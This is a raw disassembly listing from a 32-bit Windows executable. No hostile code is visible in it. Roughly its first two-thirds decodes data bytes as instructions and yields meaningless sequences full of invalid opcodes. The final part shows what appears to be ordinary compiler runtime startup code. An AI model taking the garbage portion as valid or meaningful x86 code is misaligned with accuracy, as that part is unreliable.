  423d69:	and    al,BYTE PTR [edx+0x1d]
  423d6c:	push   esp
  423d6d:	dec    edi
  423d6e:	pop    ss
  423d6f:	pop    ebx
  423d70:	mov    ds:0x7e51984f,al
  423d75:	add    BYTE PTR [edx],al
  423d77:	xchg   esp,eax
  423d78:	in     al,0x6f
  423d7a:	shl    BYTE PTR [eax+eax*4-0x7c7ba0d4],1
  423d81:	jae    0x423d2d
  423d83:	or     al,0x40
  423d86:	aad    0xc
  423d88:	aam    0x8
  423d8a:	mov    WORD PTR [edx+0x50],cs
  423d8d:	aaa    
  423d8e:	xchg   esi,eax
  423d8f:	and    BYTE PTR [edx],0x25
  423d92:	push   eax
  423d93:	or     bl,BYTE PTR [ebp-0x7df58db3]
  423d99:	cld    
  423d9a:	neg    DWORD PTR [eax+eiz*2+0x361c97b9]
  423da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423da2:	rsm    
  423da4:	sbb    eax,0xdbdcf283
  423da9:	or     al,0x3
  423dab:	mov    es,WORD PTR [ebp+esi*1+0x3b]
  423daf:	xchg   edi,eax
  423db0:	lds    esp,FWORD PTR ds:0xbe644423
  423db6:	dec    esi
  423db7:	rol    BYTE PTR [edi+ecx*4],1
  423dba:	leave  
  423dbb:	pop    ds
  423dbc:	inc    edx
  423dbd:	mov    al,0x11
  423dbf:	dec    esi
  423dc0:	mov    es,edi
  423dc2:	inc    esp
  423dc3:	dec    ebp
  423dc4:	sahf   
  423dc5:	mov    al,ds:0xdbf5d617
  423dca:	cmc    
  423dcb:	lock popf 
  423dcd:	les    edx,FWORD PTR [edi]
  423dcf:	ins    DWORD PTR es:[edi],dx
  423dd0:	lods   al,BYTE PTR ds:[esi]
  423dd1:	jno    0x423ddb
  423dd3:	or     esi,DWORD PTR [ecx-0x7e]
  423dd6:	or     esp,ebx
  423dd8:	lods   eax,DWORD PTR ds:[esi]
  423dd9:	push   0x2d
  423ddb:	xchg   ebp,eax
  423ddc:	ds enter 0x3fb4,0x91
  423de1:	xlat   BYTE PTR ds:[ebx]
  423de2:	xchg   ebp,eax
  423de3:	xor    BYTE PTR [edx+0x38],0xe9
  423de7:	sbb    dh,BYTE PTR [eax-0x1cde306a]
  423ded:	pop    esp
  423dee:	mov    eax,0xa1a34cf6
  423df3:	fstp   QWORD PTR [ecx-0x6c571461]
  423df9:	jo     0x423d8c
  423dfb:	nop
  423dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dfd:	je     0x423e3c
  423dff:	mov    al,ds:0xaf7349b2
  423e04:	lahf   
  423e05:	mov    dl,0xe8
  423e07:	popa   
  423e08:	gs push ss
  423e0a:	add    DWORD PTR [eax],0x30
  423e0d:	dec    ebp
  423e0e:	and    BYTE PTR [esi],cl
  423e10:	xor    ecx,0x63a96af4
  423e16:	fwait
  423e17:	pop    ds
  423e18:	jbe    0x423dc2
  423e1a:	mov    dl,dh
  423e1c:	leave  
  423e1d:	mov    dh,0x88
  423e1f:	xor    BYTE PTR [ecx-0x734099c4],cl
  423e25:	sub    BYTE PTR [ebx],cl
  423e27:	fdiv   QWORD PTR ds:0x9686324a
  423e2d:	or     DWORD PTR [esi],ebp
  423e2f:	cmp    DWORD PTR [eax+0x2],0xdb7280c2
  423e36:	gs jb  0x423dba
  423e39:	push   0xffffff98
  423e3b:	xchg   edx,eax
  423e3c:	test   BYTE PTR ds:0xc7f80e5a,bh
  423e42:	stos   BYTE PTR es:[edi],al
  423e43:	xchg   esi,eax
  423e44:	push   esi
  423e45:	jb     0x423e94
  423e47:	mov    edi,DWORD PTR ds:0x8ed0357d
  423e4d:	out    dx,eax
  423e4e:	mov    al,ds:0xb120a716
  423e53:	pop    ss
  423e54:	xor    al,BYTE PTR [ebx+0x3b5253b3]
  423e5a:	cmp    ebp,DWORD PTR [ecx-0x380c95ec]
  423e60:	add    BYTE PTR [ebp-0x399dafb],cl
  423e66:	(bad)  
  423e67:	adc    ebx,edx
  423e69:	aas    
  423e6a:	ins    BYTE PTR es:[edi],dx
  423e6b:	dec    ecx
  423e6c:	lock out dx,eax
  423e6e:	les    ebp,FWORD PTR [eax-0xc]
  423e71:	xchg   edi,eax
  423e72:	pop    esp
  423e73:	cmp    ecx,0xffffffe6
  423e76:	mov    edx,0xec65655b
  423e7b:	pop    eax
  423e7c:	ins    BYTE PTR es:[edi],dx
  423e7d:	xchg   edi,eax
  423e7e:	addr16 pop esi
  423e80:	pop    ebx
  423e81:	pop    edi
  423e82:	lods   eax,DWORD PTR ds:[esi]
  423e83:	gs mov cl,0x79
  423e86:	ret    0x138a
  423e89:	fmul   DWORD PTR ds:0x5ce2af1e
  423e8f:	pop    eax
  423e90:	and    DWORD PTR [eax+0x6849a310],ebx
  423e96:	cmp    al,0x2c
  423e98:	and    dl,BYTE PTR [edx]
  423e9a:	fidiv  WORD PTR [eax+0x3447c87b]
  423ea0:	int3   
  423ea1:	out    0x95,eax
  423ea3:	mov    bh,0x2c
  423ea5:	pop    esi
  423ea6:	aas    
  423ea7:	adc    al,0x89
  423ea9:	pushf  
  423eaa:	fisttp QWORD PTR [esi+edi*2]
  423ead:	scas   al,BYTE PTR es:[edi]
  423eae:	out    0x37,eax
  423eb0:	lods   eax,DWORD PTR ds:[esi]
  423eb1:	sub    eax,0xba2140c7
  423eb6:	mov    cl,0xc8
  423eb8:	mov    ebx,ss
  423eba:	cdq    
  423ebb:	sub    ch,BYTE PTR [eax]
  423ebd:	pop    es
  423ebe:	add    ah,ch
  423ec0:	mov    WORD PTR [edi+ecx*8-0x4c775c29],gs
  423ec7:	int3   
  423ec8:	sub    dl,BYTE PTR [edi-0x6d]
  423ecb:	mov    al,ds:0x98c2b097
  423ed0:	jp     0x423e78
  423ed2:	or     DWORD PTR [ebp+0x7e80e688],0xffffffc1
  423ed9:	add    edx,ebx
  423edb:	xchg   esi,eax
  423edc:	les    esi,FWORD PTR [ebx+0x3b]
  423edf:	div    DWORD PTR [ecx]
  423ee1:	imul   ebx,DWORD PTR [edx],0x2
  423ee4:	in     al,dx
  423ee5:	inc    edi
  423ee6:	add    ebp,edx
  423ee8:	mov    ecx,0x2218ecd0
  423eed:	ret    0xa975
  423ef0:	ins    BYTE PTR es:[edi],dx
  423ef1:	sub    eax,0x8243d450
  423ef6:	adc    BYTE PTR [eax],0x68
  423ef9:	imul   eax,DWORD PTR [ecx-0x7180d6ac],0x4d018500
  423f03:	push   ss
  423f04:	mov    eax,0x478b96a8
  423f09:	fsubr  DWORD PTR [ecx]
  423f0b:	lods   eax,DWORD PTR ds:[esi]
  423f0c:	aad    0xf6
  423f0e:	cmp    BYTE PTR ds:0xfa56050d,ah
  423f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f15:	inc    ebx
  423f16:	xchg   esp,eax
  423f17:	imul   ecx,DWORD PTR [ebx],0x5c
  423f1a:	sti    
  423f1b:	cmc    
  423f1c:	xor    cl,BYTE PTR [ebp-0x50]
  423f1f:	mov    ss,WORD PTR [ecx-0x7f]
  423f22:	fiadd  WORD PTR [eax+edx*8]
  423f25:	in     al,dx
  423f26:	loopne 0x423f45
  423f28:	in     al,0x8a
  423f2a:	imul   eax,DWORD PTR [ebx+0x2a36a461],0x9c7e881f
  423f34:	pop    edx
  423f35:	mov    ecx,0xf745f43a
  423f3a:	mov    cl,dh
  423f3c:	ret    0xe92a
  423f3f:	xor    al,dl
  423f41:	adc    eax,0xcd45d71e
  423f46:	add    ah,BYTE PTR [eax+0x3c]
  423f49:	xchg   edi,eax
  423f4a:	scas   ax,WORD PTR es:[edi]
  423f4c:	stos   DWORD PTR es:[edi],eax
  423f4d:	inc    esp
  423f4e:	inc    edx
  423f4f:	(bad)  [ecx+0x68]
  423f52:	das    
  423f53:	adc    BYTE PTR [edx+0x1b],cl
  423f56:	ins    BYTE PTR es:[edi],dx
  423f57:	mov    dh,0x46
  423f59:	jnp    0x423f93
  423f5b:	xchg   esp,eax
  423f5c:	sar    ch,1
  423f5e:	jo     0x423fcc
  423f60:	mov    cl,0x5c
  423f62:	(bad)  
  423f64:	cmp    eax,0xc26fa654
  423f69:	sahf   
  423f6a:	fld    DWORD PTR [edi-0x43]
  423f6d:	ror    BYTE PTR [ecx-0x11d0e8d9],1
  423f73:	push   ecx
  423f74:	mov    esi,0x3d687bf1
  423f79:	mov    cl,0xa6
  423f7b:	int    0xea
  423f7d:	icebp  
  423f7e:	add    eax,0xaa39ae04
  423f83:	and    DWORD PTR [esi-0x4e0c1eb7],edi
  423f89:	add    al,0x4e
  423f8b:	xchg   ecx,eax
  423f8c:	rol    BYTE PTR [edx-0xc8ea0b7],0x78
  423f93:	rcr    esi,1
  423f95:	pop    edi
  423f96:	push   cs
  423f97:	js     0x423fdd
  423f99:	mov    ebx,0x49fe5ce3
  423f9e:	aad    0x2c
  423fa0:	mov    eax,ds:0x9b026cde
  423fa5:	add    eax,0xcf89454
  423faa:	inc    ebp
  423fab:	xlat   BYTE PTR ds:[ebx]
  423fac:	not    DWORD PTR [ebx-0x44c8edf6]
  423fb2:	mov    eax,ds:0x99693e6
  423fb7:	loope  0x423f3b
  423fb9:	xor    edx,DWORD PTR [ebx]
  423fbb:	outs   dx,DWORD PTR ds:[esi]
  423fbc:	enter  0x1947,0x1c
  423fc0:	into   
  423fc1:	(bad)  
  423fc2:	jge    0x423f7a
  423fc4:	push   dx
  423fc6:	or     BYTE PTR [ebp-0x3b12e242],0x9a
  423fcd:	fxtract 
  423fcf:	fisttp DWORD PTR ds:0x69f194dc
  423fd5:	xor    bh,al
  423fd7:	int3   
  423fd8:	xchg   esp,eax
  423fd9:	lods   al,BYTE PTR ds:[esi]
  423fda:	mov    ch,ah
  423fdc:	test   BYTE PTR ds:0x6a4a5927,al
  423fe2:	pop    edx
  423fe3:	ret    0x610c
  423fe6:	fstp   DWORD PTR [edi+0x53]
  423fe9:	fidivr DWORD PTR [esi]
  423feb:	xor    al,0xd4
  423fed:	test   al,0x75
  423fef:	int    0x79
  423ff1:	fldcw  WORD PTR [eax]
  423ff3:	jae    0x423fdc
  423ff5:	sub    BYTE PTR [ecx-0x58],dl
  423ff8:	(bad)  
  423ff9:	xchg   ecx,eax
  423ffa:	xor    al,0x23
  423ffc:	fs mov ecx,ds
  423fff:	(bad)
  424003:	mov    al,ds:0x41bd36b2
  424008:	jnp    0x423faf
  42400a:	xor    ebx,DWORD PTR [ebx]
  42400c:	and    esi,eax
  42400e:	mov    ?,esp
  424010:	xor    DWORD PTR [ecx-0x78],0xffffffd6
  424014:	and    al,0x3a
  424016:	fisubr DWORD PTR [edi]
  424018:	xchg   ecx,eax
  424019:	push   esi
  42401a:	push   ss
  42401b:	sub    DWORD PTR [ebx],edi
  42401d:	add    dl,dh
  42401f:	ds out dx,eax
  424021:	int3   
  424022:	out    dx,al
  424023:	es call 0xdde877
  424029:	(bad)  
  42402a:	retf   0x9b60
  42402d:	cmp    DWORD PTR [esi-0x55d9ab18],ebx
  424033:	stos   DWORD PTR es:[edi],eax
  424034:	call   0x3c19:0xcbda5566
  42403b:	js     0x424066
  42403d:	mov    ebp,0xcd29c142
  424042:	daa    
  424043:	add    eax,0x4c169595
  424048:	rol    BYTE PTR [edi-0x17116704],0xb4
  42404f:	sub    eax,0x930611bc
  424054:	mov    ds:0x11f05eb0,al
  424059:	push   eax
  42405a:	shl    cl,1
  42405c:	sub    BYTE PTR [esi+0x7aa70d50],0x64
  424063:	xlat   BYTE PTR ds:[ebx]
  424064:	dec    ebx
  424065:	xor    DWORD PTR [edi+0x268b0b05],esp
  42406b:	jmp    0x424045
  42406d:	enter  0x965,0xc4
  424071:	inc    ecx
  424072:	mov    al,ds:0x48e08c19
  424077:	xor    DWORD PTR [edi+0x15],edi
  42407a:	fdivrp st(7),st
  42407c:	stos   DWORD PTR es:[edi],eax
  42407d:	xchg   ebp,edx
  42407f:	stos   BYTE PTR es:[edi],al
  424080:	dec    eax
  424081:	jae    0x4240e8
  424083:	sub    BYTE PTR [edx+0x33b95574],ah
  424089:	dec    esi
  42408a:	dec    BYTE PTR [ebp+0x1]
  42408d:	inc    edx
  42408e:	pop    edi
  42408f:	fild   WORD PTR [edx-0x187f19df]
  424095:	ins    DWORD PTR es:[edi],dx
  424096:	and    ebp,ebx
  424098:	adc    DWORD PTR [ebp+edi*2+0x41df3534],ebp
  42409f:	(bad)  
  4240a0:	push   ebp
  4240a1:	retf   0xa310
  4240a4:	mov    dh,0xe7
  4240a6:	inc    eax
  4240a7:	adc    ch,BYTE PTR [edx+ecx*4]
  4240aa:	aam    0x5a
  4240ac:	mov    ebp,0xeab84394
  4240b1:	sbb    ebp,esi
  4240b3:	sbb    DWORD PTR [ebp+0x20f2da14],esi
  4240b9:	add    edx,esi
  4240bb:	push   ds
  4240bc:	xchg   edi,eax
  4240bd:	jno    0x4240ce
  4240bf:	cld    
  4240c0:	in     al,dx
  4240c1:	mov    ds:0xe238d967,eax
  4240c6:	clc    
  4240c7:	(bad)  
  4240c8:	jg     0x424136
  4240ca:	das    
  4240cb:	fist   DWORD PTR [eax]
  4240cd:	cmp    edx,DWORD PTR [esi-0x3]
  4240d0:	and    bl,BYTE PTR [ebx-0x309f0c84]
  4240d6:	dec    eax
  4240d7:	inc    ecx
  4240d8:	add    al,0x3f
  4240da:	fimul  DWORD PTR [edi+0x7fcfd4c2]
  4240e0:	cli    
  4240e1:	mov    esi,0xfaa2945e
  4240e6:	and    dl,cl
  4240e8:	daa    
  4240e9:	xchg   esp,eax
  4240ea:	xchg   ecx,eax
  4240eb:	loop   0x424090
  4240ed:	aaa    
  4240ee:	in     eax,dx
  4240ef:	sbb    bl,bl
  4240f1:	mov    edx,0x6843da76
  4240f6:	mov    dh,bl
  4240f8:	pop    eax
  4240f9:	cmp    DWORD PTR [edx+esi*8+0x56896b3e],0xd8b189f0
  424104:	xor    al,0x48
  424106:	gs js  0x424152
  424109:	enter  0x1105,0xce
  42410d:	xchg   edx,eax
  42410e:	bound  esp,QWORD PTR ds:0x476e3237
  424114:	mov    ebx,0xd229af40
  424119:	cld    
  42411a:	fdivr  QWORD PTR [eax-0x799a99df]
  424120:	mov    ah,0x2e
  424122:	les    edi,FWORD PTR [ebx+0x59b0041e]
  424128:	hlt    
  424129:	stos   DWORD PTR es:[edi],eax
  42412a:	mov    ah,0xb7
  42412c:	xor    BYTE PTR [esi-0x64cb2ab5],bh
  424132:	mov    ds:0x9b206ff3,al
  424137:	sahf   
  424138:	mov    esp,esi
  42413a:	sub    ah,ch
  42413c:	fstp   st(6)
  42413e:	loop   0x424172
  424140:	call   FWORD PTR [edx+ebx*4+0x74993681]
  424147:	mov    cl,0xde
  424149:	and    DWORD PTR [edx],0xe2c226d3
  42414f:	cmc    
  424150:	sub    al,0xf6
  424152:	sbb    DWORD PTR [ebp-0x5e],0xde96d299
  424159:	jo     0x4241cc
  42415b:	adc    eax,0xd272d1d8
  424160:	(bad)  
  424161:	dec    edx
  424162:	bound  ecx,QWORD PTR [edi+0x50]
  424165:	adc    ebp,ebp
  424167:	aaa    
  424168:	sub    eax,0x4a81536d
  42416d:	cmp    al,ah
  42416f:	sbb    ch,BYTE PTR [ebx]
  424171:	inc    ecx
  424172:	aad    0xf6
  424174:	xchg   esp,eax
  424175:	je     0x424151
  424177:	call   0x3f08577d
  42417c:	xor    ebp,ebp
  42417e:	mov    bl,0xd8
  424180:	mov    dl,0xf9
  424182:	or     al,0xe
  424184:	in     al,0xba
  424186:	enter  0x46d2,0xb0
  42418a:	mov    edx,0xc389eada
  42418f:	std    
  424190:	retf   0x44c0
  424193:	ror    BYTE PTR [edx+eax*4+0x354c5510],1
  42419a:	mov    esi,0xfadd051d
  42419f:	mov    DWORD PTR [ebx],ebp
  4241a1:	loope  0x4241a6
  4241a3:	cmp    eax,ebx
  4241a5:	fistp  QWORD PTR [ecx-0x40]
  4241a8:	fs aas 
  4241aa:	shl    BYTE PTR [eax+0x4f58bd48],cl
  4241b0:	sbb    ebp,DWORD PTR [eax+ecx*8+0x70]
  4241b4:	out    0x82,eax
  4241b6:	xchg   ebx,eax
  4241b7:	imul   esi,eax,0x30816556
  4241bd:	inc    eax
  4241be:	retf   
  4241bf:	jmp    0x2f54:0x617de4d3
  4241c6:	call   0x58485870
  4241cb:	jp     0x424209
  4241cd:	stc    
  4241ce:	sbb    DWORD PTR [edi+0x7c],ebx
  4241d1:	push   ebp
  4241d2:	and    cl,BYTE PTR [edi-0x16]
  4241d5:	pop    ecx
  4241d6:	inc    esp
  4241d7:	or     eax,0x55a5c65d
  4241dc:	xor    bh,BYTE PTR [eax+0x11]
  4241df:	je     0x42425a
  4241e1:	pop    eax
  4241e2:	adc    esi,DWORD PTR [eax]
  4241e4:	xor    BYTE PTR [ebx],0x32
  4241e7:	mov    dl,0xd5
  4241e9:	scas   al,BYTE PTR es:[edi]
  4241ea:	sar    DWORD PTR [esi-0x6460c2b0],1
  4241f0:	and    BYTE PTR [edx],dh
  4241f2:	jo     0x424181
  4241f4:	ret    0xf1c9
  4241f7:	ins    DWORD PTR es:[edi],dx
  4241f8:	aas    
  4241f9:	lds    ebp,FWORD PTR [ecx-0x6c6fbb0f]
  4241ff:	add    BYTE PTR [ebx+eax*2],0x2
  424203:	jns    0x424191
  424205:	mov    eax,0xb1aec2f3
  42420a:	cwde   
  42420b:	je     0x424203
  42420d:	inc    edx
  42420e:	sbb    edx,edi
  424210:	test   BYTE PTR [eax-0x71],al
  424213:	xor    eax,DWORD PTR [edx+0x10f6946]
  424219:	fistp  WORD PTR [ecx-0x1a0959f0]
  42421f:	pop    esp
  424220:	dec    eax
  424221:	out    0x8d,al
  424223:	push   esp
  424224:	outs   dx,DWORD PTR ds:[esi]
  424225:	jge    0x4242a3
  424227:	push   eax
  424228:	sar    BYTE PTR [esi-0x3d66f536],cl
  42422e:	loopne 0x424204
  424230:	outs   dx,DWORD PTR ds:[esi]
  424231:	or     dl,ah
  424233:	lock xchg DWORD PTR [edi-0x7b9a966e],eax
  42423a:	(bad)
  42423f:	inc    edx
  424240:	pop    edi
  424241:	in     al,dx
  424242:	jmp    0x42420b
  424244:	das    
  424245:	jbe    0x4241e1
  424247:	adc    dh,BYTE PTR [ecx-0x5d]
  42424a:	in     al,dx
  42424b:	push   0x57
  42424d:	mov    gs,ebp
  42424f:	or     al,0xd9
  424251:	sub    DWORD PTR [edx-0x5b],0xffffffd3
  424255:	lds    edx,FWORD PTR [edx-0x1f]
  424258:	add    al,0xa7
  42425a:	retf   0xcf62
  42425d:	dec    ebx
  42425e:	hlt    
  42425f:	mov    ebx,0x416391e5
  424264:	dec    ebp
  424265:	in     al,0x98
  424267:	mov    eax,0x27b21d39
  42426c:	jl     0x42421a
  42426e:	loope  0x42427b
  424270:	sub    eax,0xf47d242f
  424275:	inc    edi
  424276:	mov    ch,cl
  424278:	call   0x275a:0x7bb335e6
  42427f:	retf   0x593b
  424282:	outs   dx,DWORD PTR ds:[esi]
  424283:	mov    dl,0xbf
  424285:	mov    eax,ds:0xf488f160
  42428a:	or     DWORD PTR [ecx],edi
  42428c:	test   BYTE PTR [edi+ecx*4-0x51],dl
  424290:	pop    edx
  424291:	(bad)  
  424292:	jns    0x4242e7
  424294:	xlat   BYTE PTR ds:[ebx]
  424295:	jl     0x42426a
  424297:	(bad)  
  424298:	ins    DWORD PTR es:[edi],dx
  424299:	and    edi,DWORD PTR ds:0x9388644a
  42429f:	fild   WORD PTR [ebx-0x61]
  4242a2:	test   eax,0xf4647791
  4242a7:	test   eax,0xece40d27
  4242ac:	sbb    BYTE PTR [eax+edi*8+0x1],al
  4242b0:	xor    eax,0x74c1b372
  4242b5:	scas   al,BYTE PTR es:[edi]
  4242b6:	or     DWORD PTR [edx+0x250f4cc8],edi
  4242bc:	sbb    BYTE PTR [esi],0x20
  4242bf:	mov    dh,0x2
  4242c1:	aam    0x92
  4242c3:	cs daa 
  4242c5:	sbb    al,0xa1
  4242c7:	cld    
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	push   edi
  4242ca:	dec    esi
  4242cb:	pop    esp
  4242cc:	jmp    0x8f37:0x4bb8
  4242d2:	cmp    BYTE PTR ds:0xda321fac,al
  4242d8:	hlt    
  4242d9:	adc    al,0xfc
  4242db:	out    dx,eax
  4242dc:	push   edx
  4242dd:	(bad)  
  4242de:	rcl    DWORD PTR [ebp+0x46244e36],cl
  4242e4:	push   cs
  4242e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242e6:	lock adc ch,al
  4242e9:	fsubr  QWORD PTR [edi]
  4242eb:	jle    0x424363
  4242ed:	and    DWORD PTR [esi],ebx
  4242ef:	xor    al,0x9f
  4242f1:	inc    ebp
  4242f2:	pushf  
  4242f3:	xor    al,ch
  4242f5:	sahf   
  4242f6:	dec    esi
  4242f7:	dec    ebx
  4242f8:	or     al,0x3c
  4242fa:	(bad)
  4242fe:	loop   0x42435d
  424300:	ds popf 
  424302:	leave  
  424303:	jbe    0x4242c2
  424305:	add    eax,0xaddc8977
  42430a:	adc    eax,0x6d7159b9
  42430f:	aam    0x17
  424311:	mov    cs,WORD PTR [esi]
  424313:	loopne 0x424359
  424315:	xor    bl,BYTE PTR [esi-0x38f76cfa]
  42431b:	adc    BYTE PTR [eax-0x5d],0x82
  42431f:	inc    edx
  424320:	push   esi
  424321:	out    0x13,al
  424323:	popf   
  424324:	(bad)  
  424325:	(bad)  
  424326:	idiv   DWORD PTR [ecx-0x35]
  424329:	call   0xfd6766f9
  42432e:	call   0x77e22d8d
  424333:	mov    eax,ds:0x857053a9
  424338:	pusha  
  424339:	or     ch,BYTE PTR [ebx]
  42433b:	lds    esi,FWORD PTR [esi+ebx*1-0x3695abeb]
  424342:	adc    BYTE PTR [ebp+0x2ce56c1d],dl
  424348:	(bad)  
  424349:	mov    ds:0x4d54e135,al
  42434e:	push   esi
  42434f:	mov    edi,0xfe9c7515
  424354:	mov    eax,ds:0xb487833f
  424359:	adc    eax,0xcf93ab62
  42435e:	lock stc 
  424360:	jg     0x424342
  424362:	inc    ebp
  424363:	jg     0x42435e
  424365:	pop    ss
  424366:	pushf  
  424367:	pop    ss
  424368:	jmp    0x252bc7c2
  42436d:	mov    bh,0xe
  42436f:	popf   
  424370:	out    0x2b,eax
  424372:	test   al,0x50
  424374:	and    BYTE PTR [ebp-0x11],ch
  424377:	iret   
  424378:	and    ecx,DWORD PTR [ecx]
  42437a:	pop    esp
  42437b:	scas   al,BYTE PTR es:[edi]
  42437c:	inc    edi
  42437d:	add    eax,0xba798f97
  424382:	push   ebp
  424383:	mov    ds:0xe1cba647,eax
  424388:	dec    esp
  424389:	sub    ebp,DWORD PTR [edx+eax*8-0xb]
  42438d:	sti    
  42438e:	fcmovu st,st(1)
  424390:	mov    ds:0x817f7e5a,eax
  424395:	mov    dh,0x9f
  424397:	mov    al,0x1c
  424399:	fadd   DWORD PTR [edx]
  42439b:	dec    eax
  42439c:	int3   
  42439d:	cmp    DWORD PTR [edi],esi
  42439f:	rol    DWORD PTR [edi-0x2987b68f],1
  4243a5:	sbb    eax,0x89324eb7
  4243aa:	stos   BYTE PTR es:[edi],al
  4243ab:	jne    0x42437d
  4243ad:	inc    edi
  4243ae:	dec    ebx
  4243af:	cmp    al,0x1f
  4243b1:	imul   ecx,DWORD PTR [ebp-0x19043a1],0xad54271
  4243bb:	jno    0x424423
  4243bd:	jae    0x424434
  4243bf:	mul    DWORD PTR [esi]
  4243c1:	xchg   esi,eax
  4243c2:	dec    ebx
  4243c3:	xor    BYTE PTR [eax-0x29d72697],ah
  4243c9:	retf   0xdaec
  4243cc:	xchg   edx,eax
  4243cd:	mov    edi,0xfbf298c4
  4243d2:	mov    dh,0xd
  4243d4:	ret    
  4243d5:	push   0x4e
  4243d7:	nop
  4243d8:	retf   0x37f9
  4243db:	jg     0x1584737e
  4243e1:	loope  0x424433
  4243e3:	add    BYTE PTR [ecx+0x15],cl
  4243e6:	sbb    DWORD PTR [ebx-0x16],0xffffffa1
  4243ea:	sub    al,0x72
  4243ec:	push   esp
  4243ed:	nop
  4243ee:	or     al,ah
  4243f0:	jle    0x424384
  4243f2:	mov    eax,0x3b2318e2
  4243f7:	(bad)  
  4243f8:	ins    BYTE PTR es:[edi],dx
  4243f9:	and    ebp,DWORD PTR [ebx+0x59]
  4243fc:	cmp    ecx,DWORD PTR [ebx+0x6a006a]
  424402:	call   0x424410
  424407:	xor    eax,eax
  424409:	add    esp,0x10
  42440c:	ret    0x10
  42440f:	nop
  424410:	jmp    DWORD PTR ds:0x429114
  424416:	cmp    DWORD PTR ds:0x45dabc,0x1
  42441d:	jne    0x424424
  42441f:	call   0x424962
  424424:	push   DWORD PTR [esp+0x4]
  424428:	call   0x4247eb
  42442d:	push   0xff
  424432:	call   DWORD PTR ds:0x45d1c0
  424438:	pop    ecx
  424439:	pop    ecx
  42443a:	ret    
  42443b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424442:	jne    0x424449
  424444:	call   0x424962
  424449:	push   DWORD PTR [esp+0x4]
  42444d:	call   0x4247eb
  424452:	push   0xff
  424457:	call   0x424631
  42445c:	pop    ecx
  42445d:	pop    ecx
  42445e:	ret    
  42445f:	push   0x60
  424461:	push   0x429228
  424466:	call   0x425350
  42446b:	mov    edi,0x94
  424470:	mov    eax,edi
  424472:	call   0x4253a0
  424477:	mov    DWORD PTR [ebp-0x18],esp
  42447a:	mov    esi,esp
  42447c:	mov    DWORD PTR [esi],edi
  42447e:	push   esi
  42447f:	call   DWORD PTR ds:0x429058
  424485:	mov    ecx,DWORD PTR [esi+0x10]
  424488:	mov    DWORD PTR ds:0x45dac4,ecx
  42448e:	mov    eax,DWORD PTR [esi+0x4]
  424491:	mov    ds:0x45dad0,eax
  424496:	mov    edx,DWORD PTR [esi+0x8]
  424499:	mov    DWORD PTR ds:0x45dad4,edx
  42449f:	mov    esi,DWORD PTR [esi+0xc]
  4244a2:	and    esi,0x7fff
  4244a8:	mov    DWORD PTR ds:0x45dac8,esi
  4244ae:	cmp    ecx,0x2
  4244b1:	je     0x4244bf
  4244b3:	or     esi,0x8000
  4244b9:	mov    DWORD PTR ds:0x45dac8,esi
  4244bf:	shl    eax,0x8
  4244c2:	add    eax,edx
  4244c4:	mov    ds:0x45dacc,eax
  4244c9:	xor    esi,esi
  4244cb:	push   esi
  4244cc:	mov    edi,DWORD PTR ds:0x429024
  4244d2:	call   edi
  4244d4:	cmp    WORD PTR [eax],0x5a4d
  4244d9:	jne    0x4244fa
  4244db:	mov    ecx,DWORD PTR [eax+0x3c]
  4244de:	add    ecx,eax
  4244e0:	cmp    DWORD PTR [ecx],0x4550
  4244e6:	jne    0x4244fa
  4244e8:	movzx  eax,WORD PTR [ecx+0x18]
  4244ec:	cmp    eax,0x10b
  4244f1:	je     0x424512
  4244f3:	cmp    eax,0x20b
  4244f8:	je     0x4244ff
  4244fa:	mov    DWORD PTR [ebp-0x1c],esi
  4244fd:	jmp    0x424526
  4244ff:	cmp    DWORD PTR [ecx+0x84],0xe
  424506:	jbe    0x4244fa
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xf8],esi
  424510:	jmp    0x424520
  424512:	cmp    DWORD PTR [ecx+0x74],0xe
  424516:	jbe    0x4244fa
  424518:	xor    eax,eax
  42451a:	cmp    DWORD PTR [ecx+0xe8],esi
  424520:	setne  al
  424523:	mov    DWORD PTR [ebp-0x1c],eax
  424526:	push   0x1
  424528:	call   0x4252fd
  42452d:	pop    ecx
  42452e:	test   eax,eax
  424530:	jne    0x42453a
  424532:	push   0x1c
  424534:	call   0x42443b
  424539:	pop    ecx
  42453a:	call   0x425274
  42453f:	test   eax,eax
  424541:	jne    0x42454b
  424543:	push   0x10
  424545:	call   0x42443b
  42454a:	pop    ecx
  42454b:	call   0x42515d
  424550:	mov    DWORD PTR [ebp-0x4],esi
  424553:	call   0x424f5f
  424558:	test   eax,eax
  42455a:	jge    0x424564
  42455c:	push   0x1b
  42455e:	call   0x424416
  424563:	pop    ecx
  424564:	call   DWORD PTR ds:0x429054
  42456a:	mov    ds:0x45e274,eax
  42456f:	call   0x424e3d
  424574:	mov    ds:0x45dab4,eax
  424579:	call   0x424d9b
  42457e:	test   eax,eax
  424580:	jge    0x42458a
  424582:	push   0x8
  424584:	call   0x424416
  424589:	pop    ecx
  42458a:	call   0x424b68
  42458f:	test   eax,eax
  424591:	jge    0x42459b
  424593:	push   0x9
  424595:	call   0x424416
  42459a:	pop    ecx
  42459b:	call   0x424673
  4245a0:	mov    DWORD PTR [ebp-0x20],eax
  4245a3:	cmp    eax,esi
  4245a5:	je     0x4245ae
  4245a7:	push   eax
  4245a8:	call   0x424416
  4245ad:	pop    ecx
  4245ae:	mov    DWORD PTR [ebp-0x38],esi
  4245b1:	lea    eax,[ebp-0x64]
  4245b4:	push   eax
  4245b5:	call   DWORD PTR ds:0x429050
  4245bb:	call   0x424aff
  4245c0:	mov    DWORD PTR [ebp-0x68],eax
  4245c3:	test   BYTE PTR [ebp-0x38],0x1
  4245c7:	je     0x4245cf
  4245c9:	movzx  eax,WORD PTR [ebp-0x34]
  4245cd:	jmp    0x4245d2
  4245cf:	push   0xa
  4245d1:	pop    eax
  4245d2:	push   eax
  4245d3:	push   DWORD PTR [ebp-0x68]
  4245d6:	push   esi
  4245d7:	push   esi
  4245d8:	call   edi
  4245da:	push   eax
  4245db:	call   0x422f90
  4245e0:	mov    edi,eax
  4245e2:	mov    DWORD PTR [ebp-0x6c],edi
  4245e5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245e8:	jne    0x4245f0
  4245ea:	push   edi
  4245eb:	call   0x4247ab
  4245f0:	call   0x4247cd
  4245f5:	jmp    0x424622
